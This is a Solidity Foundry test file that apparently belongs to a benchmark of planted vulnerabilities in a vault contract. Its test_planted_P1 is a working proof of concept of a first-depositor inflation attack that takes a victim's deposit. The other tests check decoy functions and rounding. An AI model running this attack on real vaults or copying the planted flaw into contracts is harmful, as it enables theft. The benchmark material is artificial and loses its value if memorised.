// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Proof file for pair sol-01. test/Fixed.t.sol is generated from this file by make-twin.mjs and
// differs only in the import path below and in the test contract name.
import {Test, console2} from "forge-std/Test.sol";
import {AsterQuay, QuayMath} from "../src/vulnerable/AsterQuay.sol";

contract PlainToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VulnerableTest is Test {
    uint256 internal constant BPS = 10_000;

    PlainToken internal token;
    PlainToken internal stray;
    AsterQuay internal quay;

    address internal admin = makeAddr("admin");
    address internal warden = makeAddr("warden");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal mallory = makeAddr("mallory");

    function setUp() public {
        token = new PlainToken("Plain Dollar", "PLN");
        stray = new PlainToken("Stray Token", "STRAY");
        vm.startPrank(admin);
        quay = new AsterQuay(address(token), 18, keeper);
        quay.setGuardian(warden);
        vm.stopPrank();
    }

    function _deposit(address who, uint256 assets) internal returns (uint256 shares) {
        token.mint(who, assets);
        vm.startPrank(who);
        token.approve(address(quay), assets);
        shares = quay.deposit(assets, who);
        vm.stopPrank();
    }

    function _report(uint256 gross) internal {
        token.mint(keeper, gross);
        vm.startPrank(keeper);
        token.approve(address(quay), gross);
        quay.reportYield(gross);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------
    // P1: the first holder mints 1 unit of receipts, sends 10,000 tokens straight to the
    // contract, and the next depositor's 5,000 tokens are converted to zero receipts.
    // ---------------------------------------------------------------------------------------
    function test_planted_P1() public {
        uint256 donation = 10_000e18;
        uint256 victimDeposit = 5_000e18;
        uint256 attackerStart = donation + 1;
        token.mint(mallory, attackerStart);
        token.mint(alice, victimDeposit);

        vm.startPrank(mallory);
        token.approve(address(quay), 1);
        quay.deposit(1, mallory);
        token.transfer(address(quay), donation);
        vm.stopPrank();

        vm.startPrank(alice);
        token.approve(address(quay), victimDeposit);
        uint256 victimShares = quay.deposit(victimDeposit, alice);
        vm.stopPrank();

        console2.log("victim receipts        ", victimShares);
        console2.log("victim maxWithdraw     ", quay.maxWithdraw(alice));
        console2.log("attacker receipts      ", quay.balanceOf(mallory));
        console2.log("attacker previewRedeem ", quay.previewRedeem(quay.balanceOf(mallory)));

        assertEq(victimShares, 0, "victim was minted receipts");
        assertEq(quay.balanceOf(alice), 0, "victim holds receipts");
        assertEq(quay.maxWithdraw(alice), 0, "victim can withdraw");
        assertEq(token.balanceOf(alice), 0, "victim still has tokens");

        uint256 attackerShares = quay.balanceOf(mallory);
        vm.prank(mallory);
        uint256 payout = quay.redeem(attackerShares, mallory, mallory);

        assertEq(payout, 15_000e18 + 1, "attacker payout");
        assertEq(token.balanceOf(mallory) - attackerStart, victimDeposit, "attacker profit");
        assertEq(token.balanceOf(address(quay)), 0, "contract not emptied");
    }

    // ---------------------------------------------------------------------------------------
    // D1: sweepToken cannot move the underlying or the receipt token, is owner-only, and
    // leaves depositors whole.
    // ---------------------------------------------------------------------------------------
    function test_decoy_D1() public {
        uint256 aliceShares = _deposit(alice, 1_000e18);
        stray.mint(address(quay), 77e18);
        vm.prank(alice);
        quay.transfer(address(quay), aliceShares / 10);

        vm.prank(mallory);
        vm.expectRevert(AsterQuay.Unauthorized.selector);
        quay.sweepToken(address(stray), mallory, 77e18);

        vm.prank(warden);
        vm.expectRevert(AsterQuay.Unauthorized.selector);
        quay.sweepToken(address(stray), warden, 77e18);

        vm.startPrank(admin);
        vm.expectRevert(AsterQuay.ProtectedToken.selector);
        quay.sweepToken(address(token), admin, 1_000e18);
        vm.expectRevert(AsterQuay.ProtectedToken.selector);
        quay.sweepToken(address(token), admin, 1);
        vm.expectRevert(AsterQuay.ProtectedToken.selector);
        quay.sweepToken(address(token), admin, 0);
        vm.expectRevert(AsterQuay.ProtectedToken.selector);
        quay.sweepToken(address(quay), admin, aliceShares / 10);
        quay.sweepToken(address(stray), admin, 77e18);
        vm.stopPrank();

        assertEq(stray.balanceOf(admin), 77e18, "stray token recovered");
        assertEq(stray.balanceOf(address(quay)), 0);
        assertEq(token.balanceOf(admin), 0, "owner received underlying");
        assertEq(token.balanceOf(address(quay)), 1_000e18, "underlying moved");
        assertEq(quay.balanceOf(admin), 0, "owner received receipts");
        assertEq(quay.balanceOf(address(quay)), aliceShares / 10, "receipts moved");

        uint256 rest = quay.balanceOf(alice);
        vm.prank(alice);
        uint256 out = quay.redeem(rest, alice, alice);
        assertEq(out, 900e18, "depositor not whole");
        assertEq(token.balanceOf(alice), 900e18);
    }

    // ---------------------------------------------------------------------------------------
    // D2: exit rounding. previewWithdraw rounds the receipts charged up, and the two exit-fee
    // helpers use different denominators (BPS vs BPS + exitFeeBps). Both routes charge at
    // least exitFeeBps of what the receiver gets and never pay out more than the burned
    // receipts were worth, so every rounding step lands on the side of the remaining holders
    // and the fee recipient.
    // ---------------------------------------------------------------------------------------
    function test_decoy_D2() public {
        vm.prank(admin);
        quay.setFeePolicy(1_000, 30, feeSink);
        uint256 aliceShares = _deposit(alice, 1_000e18);
        _deposit(bob, 500e18);
        _report(150e18); // 15 tokens report fee to feeSink, 135 stay: 1,635 tokens over 1,500 deposited
        assertEq(token.balanceOf(feeSink), 15e18);
        assertEq(quay.totalAssets(), 1_635e18);

        // --- route 1: bob withdraws an exact amount
        uint256 net = 100e18 + 7;
        uint256 snap = vm.snapshotState();
        (uint256 burned, uint256 fee1) = _exitByWithdraw(bob, net);
        console2.log("withdraw: receipts burnt", burned);
        console2.log("withdraw: fee           ", fee1);
        assertEq(fee1, 300000000000000001, "withdraw fee is ceil(net * 30 / 10000)");

        // --- route 2: from the same state, bob redeems the receipts route 1 consumed
        vm.revertToState(snap);
        (uint256 net2, uint256 fee2) = _exitByRedeem(bob, burned);
        console2.log("redeem:   net out       ", net2);
        console2.log("redeem:   fee           ", fee2);
        assertGe(net2, net, "redeem of the same receipts pays at least the withdrawn amount");
        assertLe(net2 - net, 1, "and at most one unit more");
        assertGe(fee2, fee1, "redeem fee is never below the withdraw fee");

        // --- alice leaves entirely through redeem; bob stays and is not diluted
        (uint256 aliceOut, uint256 aliceFee) = _exitByRedeem(alice, aliceShares);
        console2.log("alice net out          ", aliceOut);
        console2.log("alice exit fee         ", aliceFee);
        assertLt(aliceOut, 1_090e18, "exit fee was charged");
        assertEq(quay.balanceOf(alice), 0);

        // bob can withdraw exactly what maxWithdraw reports
        uint256 bobMax = quay.maxWithdraw(bob);
        _exitByWithdraw(bob, bobMax);
        console2.log("bob maxWithdraw        ", bobMax);
        console2.log("bob claim left behind  ", quay.maxWithdraw(bob));
        assertLe(quay.maxWithdraw(bob), 1, "maxWithdraw left a withdrawable remainder");
    }

    function testFuzz_support_D2_exitNeverOverpays(
        uint256 depA,
        uint256 depB,
        uint256 gross,
        uint256 exitBps,
        uint256 amount,
        bool byWithdraw
    ) public {
        depA = bound(depA, 1, 1e30);
        depB = bound(depB, 1e6, 1e30);
        gross = bound(gross, 1, 1e30);
        exitBps = bound(exitBps, 0, 100);
        vm.prank(admin);
        quay.setFeePolicy(bound(gross, 0, 2_000), exitBps, feeSink);

        _deposit(alice, depA);
        _deposit(bob, depB);
        _report(gross);

        if (byWithdraw) {
            uint256 most = quay.maxWithdraw(bob);
            if (most == 0) return;
            _exitByWithdraw(bob, bound(amount, 1, most));
        } else {
            _exitByRedeem(bob, bound(amount, 1, quay.balanceOf(bob)));
        }
    }

    function testFuzz_support_roundTripNeverProfits(uint256 seed, uint256 amount, uint256 gross, bool byWithdraw)
        public
    {
        _deposit(alice, bound(seed, 1, 1e30));
        _report(bound(gross, 1, 1e30));
        amount = bound(amount, 1, 1e30);
        uint256 shares = _deposit(bob, amount);
        if (shares == 0) return;
        uint256 out;
        if (byWithdraw) {
            out = quay.maxWithdraw(bob);
            if (out != 0) {
                vm.prank(bob);
                quay.withdraw(out, bob, bob);
            }
        } else {
            vm.prank(bob);
            out = quay.redeem(shares, bob, bob);
        }
        assertLe(out, amount, "round trip returned more than was deposited");
    }

    function testFuzz_support_mulDiv(uint128 x, uint128 y, uint128 d, bool up) public pure {
        vm.assume(d != 0);
        uint256 expected = (uint256(x) * y) / d;
        if (up && (uint256(x) * y) % d != 0) expected += 1;
        assertEq(QuayMath.mulDiv(x, y, d, up), expected);
    }

    function test_support_mulDivWide() public pure {
        assertEq(QuayMath.mulDiv(2 ** 200, 2 ** 200, 2 ** 150, false), 2 ** 250);
        assertEq(QuayMath.mulDiv(type(uint256).max, type(uint256).max, type(uint256).max, true), type(uint256).max);
        assertEq(QuayMath.mulDiv(2 ** 255, 6, 4, false), 2 ** 255 + 2 ** 254);
        assertEq(QuayMath.mulDiv(2 ** 255 + 1, 3, 4, false), 2 ** 254 + 2 ** 253);
        assertEq(QuayMath.mulDiv(2 ** 255 + 1, 3, 4, true), 2 ** 254 + 2 ** 253 + 1);
    }

    /// @dev Withdraws `net` for `who` and checks the exit against the pre-state.
    function _exitByWithdraw(address who, uint256 net) internal returns (uint256 burned, uint256 fee) {
        uint256 assetsBefore = quay.totalAssets();
        uint256 supplyBefore = quay.totalSupply();
        uint256 sinkBefore = token.balanceOf(feeSink);
        uint256 quoted = quay.previewWithdraw(net);

        vm.prank(who);
        burned = quay.withdraw(net, who, who);
        fee = token.balanceOf(feeSink) - sinkBefore;

        assertEq(burned, quoted, "previewWithdraw != withdraw");
        _checkExit(assetsBefore, supplyBefore, burned, net, fee);
    }

    /// @dev Redeems `shares` for `who` and checks the exit against the pre-state.
    function _exitByRedeem(address who, uint256 shares) internal returns (uint256 net, uint256 fee) {
        uint256 assetsBefore = quay.totalAssets();
        uint256 supplyBefore = quay.totalSupply();
        uint256 sinkBefore = token.balanceOf(feeSink);
        uint256 quoted = quay.previewRedeem(shares);

        vm.prank(who);
        net = quay.redeem(shares, who, who);
        fee = token.balanceOf(feeSink) - sinkBefore;

        assertEq(net, quoted, "previewRedeem != redeem");
        _checkExit(assetsBefore, supplyBefore, shares, net, fee);
    }

    function _checkExit(uint256 assetsBefore, uint256 supplyBefore, uint256 burned, uint256 net, uint256 fee)
        internal
        view
    {
        // the fee is at least exitFeeBps of what the receiver got (rounded against the caller)
        assertGe(fee * BPS, net * quay.exitFeeBps(), "exit fee rounded in the caller's favour");
        // nothing beyond the pro-rata value of the burned receipts left the contract
        assertLe(net + fee, QuayMath.mulDiv(burned, assetsBefore, supplyBefore, false), "exit overpaid");
        assertEq(quay.totalAssets(), assetsBefore - net - fee, "unexpected outflow");
        // assets per receipt did not fall for the holders who stayed
        uint256 supplyAfter = quay.totalSupply();
        assertEq(supplyAfter, supplyBefore - burned);
        assertGe(quay.totalAssets() * supplyBefore, assetsBefore * supplyAfter, "remaining holders diluted");
    }
}
